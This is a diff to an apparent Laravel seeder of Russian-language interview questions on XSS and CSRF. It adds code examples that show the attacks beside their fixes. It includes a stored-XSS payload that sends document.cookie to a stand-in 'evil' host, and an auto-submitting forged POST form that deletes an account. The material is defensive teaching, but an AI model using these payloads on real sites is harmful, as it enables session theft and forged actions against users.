@@ -29,7 +29,19 @@ User::where('id', \$request->id)->first();",
             [
                 'category' => 'Безопасность',
                 'question' => 'Что такое XSS простыми словами?',
-                'answer' => 'Cross-Site Scripting — атакующий вставляет JS-код в твой HTML через пользовательский ввод. Пример: в комментарии написал <script> со сбором куки. У всех, кто откроет страницу, скрипт украдёт куки и отправит на сайт атакующего. Защита — экранирование вывода: htmlspecialchars() или {{ $var }} в Blade.',
+                'answer' => 'Cross-Site Scripting — атакующий вставляет JS-код в твой HTML через пользовательский ввод. Пример: в комментарии написал <script> со сбором куки — у всех, кто откроет страницу, скрипт украдёт куки и отправит атакующему. Защита — экранирование вывода: htmlspecialchars() в чистом PHP или {{ $var }} в Blade (он экранирует автоматически, {!! !!} — НЕ экранирует).',
+                'code_example' => "<!-- Пользователь сохранил в комментарий: -->
+<script>fetch('https://evil/?c='+document.cookie)</script>
+
+<!-- ПЛОХО — вывели как есть, скрипт выполнится у каждого -->
+<div><?= \$comment ?></div>
+
+<!-- ХОРОШО — экранирование, теги станут текстом -->
+<div><?= htmlspecialchars(\$comment, ENT_QUOTES, 'UTF-8') ?></div>
+
+<!-- В Blade — экранирование по умолчанию -->
+<div>{{ \$comment }}</div>",
+                'code_language' => 'html',
                 'difficulty' => 1,
                 'topic' => 'security.web_attacks',
             ],
@@ -50,7 +62,19 @@ User::where('id', \$request->id)->first();",
             [
                 'category' => 'Безопасность',
                 'question' => 'Что такое CSRF простыми словами?',
-                'answer' => 'Cross-Site Request Forgery — атакующий заставляет залогиненного пользователя выполнить действие на твоём сайте без его ведома. Жертва открывает сайт атакующего, тот отправляет POST на твой сайт — куки автоматически прилагаются. Защита — CSRF-токен в форме, который сервер проверяет, и SameSite=Lax/Strict у куки.',
+                'answer' => 'Cross-Site Request Forgery — атакующий заставляет залогиненного пользователя выполнить действие на твоём сайте без его ведома. Жертва открывает сайт атакующего, тот сабмитит скрытую форму POST на твой сайт — браузер автоматически прикладывает куки сессии, и действие выполняется от имени жертвы. Защита: CSRF-токен в форме (сервер сверяет с тем, что в сессии) и SameSite=Lax/Strict у куки. В Laravel — @csrf в Blade-форме автоматически.',
+                'code_example' => "<!-- Злоумышленник у себя на сайте: -->
+<form action=\"https://your-site.test/account/delete\" method=\"POST\">
+  <input name=\"confirm\" value=\"yes\">
+</form>
+<script>document.forms[0].submit()</script>
+
+<!-- Защита в Blade — токен ставится автоматически -->
+<form method=\"POST\" action=\"/account/delete\">
+  @csrf
+  <button>Удалить</button>
+</form>",
+                'code_language' => 'html',
                 'difficulty' => 1,
                 'topic' => 'security.web_attacks',
             ],
